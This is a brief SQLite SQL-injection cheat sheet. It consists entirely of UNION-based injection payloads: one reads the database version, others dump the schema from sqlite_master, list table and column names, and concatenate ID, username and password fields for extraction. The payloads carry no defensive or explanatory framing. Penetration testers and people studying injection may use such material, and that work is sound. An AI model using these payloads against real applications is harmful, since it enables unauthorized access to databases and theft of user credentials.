# SQLite 

## Version

```sql
' UNION SELECT 1,sqlite_version(), 3, 4-- -
```

## String based - Extract database structure

```sql
UNION SELECT sql FROM sqlite_schema-- -
```

## Extract table name

```sql
UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -
```

## Extract column name

```sql
UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' -- -
```

## GROUP_CONCAT COLUMN

```sql
SELECT group_concat(ID || "," || username ||"," ||password||":") FROM table_name-- -
```

